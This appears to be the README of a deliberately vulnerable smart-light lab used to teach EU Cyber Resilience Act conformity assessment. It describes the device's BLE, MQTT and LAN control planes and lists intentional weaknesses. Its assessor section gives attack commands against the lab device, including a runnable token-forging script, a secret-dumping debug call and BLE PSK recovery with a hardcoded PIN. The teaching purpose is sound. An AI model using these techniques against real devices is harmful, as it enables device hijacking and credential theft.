# BulbBee - Consumer Smart-Light Lab

> **Layer 3 device landing page and single overview.** BulbBee is the VulnZoo reference for a **CRA default-category** product: a budget WiFi smart light on a Raspberry Pi (OpenWRT) driving a WS2812 RGB ring. Control reaches the ring over three planes, all relayed to one lighting owner: BLE GATT (the app channel), an outbound MQTT cloud tunnel, and a Tuya-style AES-CCM LAN port. The bring-up and secure baselines (BULB-A0..A5) ship robust code, the intentional weaknesses are the shipped **default degradations** of those baselines, restored to robust by the `secure` toggle. This page consolidates the architecture, the secure-mode matrix, the three-plane findings and the assessor run. The full build-and-run walkthrough is [`LAB_SETUP.md`](LAB_SETUP.md), the classic finding docs are under [`Vulns/`](Vulns/), and the CRA dossier under [`CRA/`](CRA/). The vulnerabilities are intentional, do not harden them (flip `secure` to compare).

The lab is framed as the sample a tester receives for a CRA conformity assessment of a self-declared product, and the student plays the assessor. It fills a specific gap in the ecosystem: the roughly 90% of products with digital elements that fall in no vertical of Annex III or Annex IV of the EU Cyber Resilience Act, and therefore inherit only the baseline.

## Quick facts

|                     |                                                                     |
| ------------------- | ------------------------------------------------------------------- |
| Domain              | Consumer IoT, smart lighting (CRA default category)                 |
| Platform            | OpenWRT v24.10.2 on Raspberry Pi 3B+/4                              |
| LED hardware        | WS2812 RGB ring (DIN, 5V, GND), driven over SPI0 MOSI (GPIO10)      |
| App control channel | BLE GATT (hci0), `ble_light.py`, robust LE SC + Passkey pairing under `secure` (BULB-A2) |
| Local control API   | HTTP on `:8082` (`/state`, `/health`, `/set`, `/scene`, `/config`), secondary LAN/diagnostics; on-device CLI `bulbctl` |
| LAN/TCP plane       | AES-CCM local control on `:6668` (`local_tcp.py`, BULB-A4), Tuya-style |
| Cloud plane         | outbound MQTT tunnel to a `mosquitto` emulator (`cloud_tunnel.py` + `cloud_api/bulbbee/`, `:1883`/`:8883`, BULB-A3) + REST API `:5004` (BULB-CLD) |
| Standards lens      | OWASP IoT Top 10 + ETSI EN 303 645 + CRA Annex I                    |
| Network             | `192.168.2.0/24`, Pi at `192.168.2.1`, direct Ethernet             |

## Why this lab: the CRA default category

Every other VulnZoo lab models a device type the CRA treats specially (RoutCoon is an Annex III **important** router, Canary automotive, CareOtter medical, OctoBot industrial). A smart light is listed nowhere in Annex III or Annex IV, so it inherits only the baseline, which makes BulbBee the reference for the default path:

- **Conformity route**: self-assessment under **Module A (internal control)**. The manufacturer draws up the EU Declaration of Conformity and affixes the CE marking with no notified body, and may rely on a harmonised standard to presume conformity with the Annex I essential requirements.
- **Baseline standard**: **ETSI EN 303 645** is the presumption-of-conformity anchor for a consumer IoT device, so each finding maps to an EN 303 645 provision as well as an OWASP IoT Top 10 entry and a CRA Annex I requirement.
- **Teaching value**: the same claim-versus-device gap the RoutCoon dossier teaches, on the lighter default route, plus an explicit default-versus-important contrast. The manufacturer dossier that carries this framing is under [`CRA/`](CRA/) (BULB-CRA).

## Architecture

One daemon (`lighting_service.py`) owns the ring and the lighting state on `:8082`. Every plane is a thin adapter that translates its wire format into a lighting command and applies it through that owner (`bulb_client.py`), so there is never a second writer to the SPI/ring.

```
                         +-----------------------------------------------+
   BLE central (app) --> | ble_light.py    (GATT 0xFF30/0xFF40)          |
   cloud (mosquitto) --> | cloud_tunnel.py (outbound MQTT :1883/:8883)   |  -> lighting_service.py (:8082)
   LAN host          --> | local_tcp.py    (AES-CCM :6668)               |     - WS2812 driver (ws2812.py)
   LAN host          --> | HTTP :8082 / bulbctl (diagnostics)            |     - scenes, state, sim/real
                         +-----------------------------------------------+          |
   secrets (sim flash): session_token.py + secret_store.py                          v
                                                              SPI /dev/spidev0.0 -> [ WS2812 ring ]
```

### Control planes

| Plane | Where | Transport | Auth (default vs secure) |
|-------|-------|-----------|--------------------------|
| BLE GATT (app) | `ble_light.py` | BLE, service `0xFF30` (control) + `0xFF40` (provisioning) | Just Works / hardcoded PIN vs LE SC + Passkey (BULB-A2) |
| Cloud tunnel | `cloud_tunnel.py` + `cloud_api/bulbbee/` | outbound MQTT `:1883` / TLS `:8883` | serial-derived token, plaintext vs per-device HMAC token, TLS (BULB-A3) |
| LAN/TCP | `local_tcp.py` | TCP `:6668`, AES-CCM frames | static firmware key vs per-device key (BULB-A4) |
| HTTP (diagnostics) | `lighting_service.py` | HTTP `:8082` | unauthenticated vs authenticated + `/debug` off |

BLE GATT `0xFF31` (Control, write JSON, same shape as HTTP `/set`+`/scene`) and `0xFF32` (State, read/notify). HTTP `:8082`: `GET /health`, `GET /state`, `GET /config`, `POST /set {"power":true,"brightness":200,"color":[10,20,30]}`, `POST /scene {"scene":"rainbow|solid|off|breathe"}`. The on-device CLI `bulbctl` (`color|bright|scene|on|off|state`) is a thin client of `:8082`.

## WS2812 driving

The ring is driven from `ws2812.py` over SPI at `/dev/spidev0.0` (GPIO10 = SPI0 MOSI = DIN). Each WS2812 bit is encoded as three SPI bits at about 2.4 MHz (`1` -> `110`, `0` -> `100`), so one LED (24 bits, GRB) becomes nine SPI bytes, packed into one SPI write per refresh (only `fcntl.ioctl` + `os.write`, no `python3-spidev` / `rpi_ws281x`). When `/dev/spidev0.0` is absent or `use_real_hardware` is false, the driver keeps the frame buffer in memory and `state.json` instead, so the lab runs headless. Calibration knobs (`led_count`, `brightness`, `gamma`, `spi_hz`, `color_order`) live in `config.json` because a real ring's timing and color drift from the on-paper values. Pinning `core_freq` in the boot config is required so the SPI baud does not drift when the CPU idles (without it the ring freezes ~15-20 s after boot).

## Launch and verify

```sh
# package + deploy
cd src/labs/bulbbee/files && tar -czf bulbbee.tar.gz opt etc usr
mv bulbbee.tar.gz ../../vulnzoo/files/usr/lib/vulnzoo-devices/bulbbee.tar.gz
# load via Device Manager (http://192.168.2.1:8080, select bulbbee) or the *-bulbbee-* hooks, then:
curl http://192.168.2.1:8082/health                                   # {"status":"ok"}
curl -X POST http://192.168.2.1:8082/scene -d '{"scene":"rainbow"}'    # ring animates (or sim frame advances)
```

The full walkthrough (WS2812 wiring, SPI enablement, the BLE / cloud-tunnel / LAN-TCP planes, secure mode) is in [`LAB_SETUP.md`](LAB_SETUP.md). The cloud stack (broker + REST API) is managed by `src/cloud_api/bulbbee/cloudctl.sh` (`start|stop|restart|reset|status|logs|pub|sub`).

## Secure mode (`secure` toggle)

Every service reads `secure` from `/opt/bulbbee/config.json` (bake it into the tarball, the cold-boot re-extraction restores the file). One flag flips all planes between the shipped degraded posture and the robust one.

| Mechanism | Degraded default (finding) | Robust secure branch | Code |
|-----------|----------------------------|----------------------|------|
| BLE pairing | Just Works, no bonding, plain prov chars (BULB-P01) | LE SC + Passkey agent, `encrypt-authenticated-*` (BULB-A2) | `ble_light.py` |
| WiFi PSK delivery | cleartext over unbonded link, PSK read back (BULB-P02) | LE-SC-encrypted link, PSK not returned (BULB-A2) | `ble_light.py` |
| Provisioning PIN | hardcoded `8080`, no lockout (BULB-P07) | reject default PIN, lockout after 5 | `ble_light.py` |
| Local (LAN/TCP) key | static `bulbbee-local-16` in firmware (BULB-P03) | per-device HMAC key (BULB-A4) | `local_tcp.py` |
| Session token | key from vendor salt + serial (BULB-P04) | random per-device secret, rotatable (BULB-A3) | `session_token.py` |
| Cloud tunnel transport | plaintext MQTT `:1883` (BULB-P02) | MQTT over TLS `:8883` (BULB-A3) | `cloud_tunnel.py` |
| Owner binding | not enforced, app-only (BULB-P05) | write-once, device-enforced (BULB-A5) | `secret_store.py` |
| LAN proximity = control | shared key + no owner check (BULB-P06) | per-device key + enforced binding | `local_tcp.py` + `secret_store.py` |
| Debug surface | `GET /debug` dumps secrets (BULB-P07) | `/debug` refused | `lighting_service.py` |
| Control surface | unauthenticated (classic BULB-02) | authenticated, secrets redacted | `lighting_service.py` |
| Scene payload | unbounded LED count (classic BULB-07) | count clamped | `lighting_service.py` |
| OTA update | unsigned (classic BULB-04) | signature/verification branch | `update_agent.py` |

## Three-plane findings (BULB-P01..P07)

The weaknesses along the BLE three-plane architecture, each the shipped default degradation of a secure baseline (BULB-A2..A5). A separate ID axis from the classic per-device catalogue in [`Vulns/`](Vulns/), which stays intact and is referenced where they overlap. Every P-finding is neutralized by `secure=true`, and each divergence is asserted by the module's `--selfcheck`.

| ID | Plane finding | Substrate (default) | Baseline degraded | Classic overlap | EN 303 645 |
|----|---------------|---------------------|-------------------|-----------------|------------|
| BULB-P01 | BLE pairing MITM (Just Works / broken passkey) | `ble_light.py` no bonding | BULB-A2 | BULB-01 | 5.5 |
| BULB-P02 | WiFi PSK over BLE in cleartext | `ble_light.py` `_prov_read` PSK | BULB-A2 | BULB-03 + 05 | 5.4 |
| BULB-P03 | Static local key recoverable from firmware | `local_tcp.py` `STATIC_LOCAL_KEY` | BULB-A4 | net-new | 5.5 |
| BULB-P04 | Session token static / derivable from serial | `session_token.py` `_static_key` | BULB-A3 | net-new (rel. BULB-05) | 5.1 |
| BULB-P05 | Owner binding only in the app | `secret_store.py` `check_owner` True | BULB-A5 | net-new | 5.6 |
| BULB-P06 | LAN/TCP proximity = control | `local_tcp.py` key-only gate | BULB-A4 + A5 | BULB-02 + 06 | 5.6 |
| BULB-P07 | Secure-by-default violations (debug, logging, re-provisioning) | `config.json` `debug:true`, no lockout | all A-series | BULB-06 | 5.6 |

## Classic vulnerability catalogue

The classic per-device findings (unauthenticated BLE onboarding BULB-01, unauthenticated control surface BULB-02, cleartext replayable channel BULB-03, unsigned OTA BULB-04, plaintext secrets BULB-05, insecure defaults / `/debug` BULB-06, scene-payload DoS BULB-07), the cloud API BOLA + weak JWT (BULB-CLD), and the Android app findings (BULB-APP), with full frontmatter and per-finding root cause / repro / fix, are under [`Vulns/`](Vulns/) ([`Vulns/README.md`](Vulns/README.md) is the roadmap). Several (unsigned OTA, scene DoS) are still-present code the three-plane axis does not restate.

## Assessor battery

A single guided run against the live device, in default mode then re-run with `secure=true` to see each test refused. Each names the weakness and the EN 303 645 / CRA requirement it fails. Full commands are inline below, the CRA answer key is [`CRA/99-Assessor-Gap-Key.md`](CRA/99-Assessor-Gap-Key.md).

| # | Test | Command (default mode) | Weakness | EN 303 645 | Secure refuses |
|---|------|------------------------|----------|------------|----------------|
| 0 | Surface scan | `nmap -sS -sV -p- 192.168.2.1` (expect :22/:53/:67/:8080/:8082/:6668 + BLE) | attack surface | 5.6 | n/a |
| 1 | Debug dump | `curl http://192.168.2.1:8082/debug` | BULB-P07 / BULB-06 | 5.6 | yes |
| 2 | Unauth LAN control | `curl -X POST http://192.168.2.1:8082/scene -d '{"scene":"rainbow"}'` and an AES-CCM frame to `:6668` under `b"bulbbee-local-16"` | BULB-P06 / P03 / BULB-02 | 5.6 | yes |
| 3 | Pairing MITM | `bluetoothctl scan le` + connect with no passkey prompt (Just Works), sniff the pairing | BULB-P01 / BULB-01 | 5.5 | yes |
| 4 | Secret recovery | write PIN `8080` to `0xFF41`, read `0xFF42` (PSK cleartext); `cat /tmp/bulbbee/provisioning.json` | BULB-P02 / P03 / BULB-05 | 5.4 | yes |
| 5 | Token spoof | reproduce `session_token._static_key(serial)`, forge a confirming token | BULB-P04 | 5.1 | yes |
| 6 | Device hijack | drive the device from a non-owner client (any of 2/3) | BULB-P05 | 5.6 | yes |
| 7 | Abusive re-provisioning | re-issue `wifi_set` over BLE onto an attacker AP (no lockout, window never closes) | BULB-P01 / P07 | 5.1 / 5.6 | yes |

Test 5, runnable and selfcheck-proven:

```sh
python3 - <<'PY'
import sys; sys.path.insert(0,"/opt/bulbbee")
import session_token, hashlib, hmac, json, time
s = session_token.device_serial()
body = json.dumps({"dev":s,"iat":int(time.time()),"exp":int(time.time())+3600,"nonce":"00"}, sort_keys=True, separators=(",",":")).encode()
sig = hmac.new(session_token._static_key(s), body, hashlib.sha256).hexdigest()
forged = session_token._b64(body)+"."+sig
print("confirms default:", session_token.confirm(forged, s, secure=False) is not None)   # True
print("confirms secure :", session_token.confirm(forged, s, secure=True) is not None)    # False
PY
```

## Documents

- [`LAB_SETUP.md`](LAB_SETUP.md) - student setup and run guide (wiring, SPI, load, verify, the three control planes, secure mode).
- [`Vulns/README.md`](Vulns/README.md) - classic vulnerability roadmap (BULB-01..07, BULB-CLD, BULB-APP) with per-finding docs and CRA / EN 303 645 mapping.
- [`CRA/`](CRA/) - the CRA **default-category** manufacturer dossier (Module A, self-declared DoC, Annex I mapping, SBOM, user info, assessor gap key).
- [`../../labs/bulbbee/CONTEXT.md`](../../labs/bulbbee/CONTEXT.md) - Layer 2 lab contract (the three planes + secret store as components).
- [`../RoutCoon/CRA/`](../RoutCoon/CRA/) - the important-product dossier BulbBee contrasts against.

## Status

The bring-up and secure baselines (BULB-A0..A5), the secure toggle (BULB-SEC), the three-plane findings (BULB-P01..P07), the assessor battery (BULB-EVAL) and the CRA dossier (BULB-CRA) are implemented through the MWP pipeline ([`../../../stages/TARGET_BULBBEE.md`](../../../stages/TARGET_BULBBEE.md), 16/16). BULB-A0 is certified live on the Pi, the BLE/cloud/LAN planes are proven by unit selfcheck with the live on-Pi / BLE-central / broker round-trips pending. The classic catalogue (BULB-01..07, BULB-CLD, BULB-APP) keeps its prior status. Evidence: `stages/05_verify/output/`.
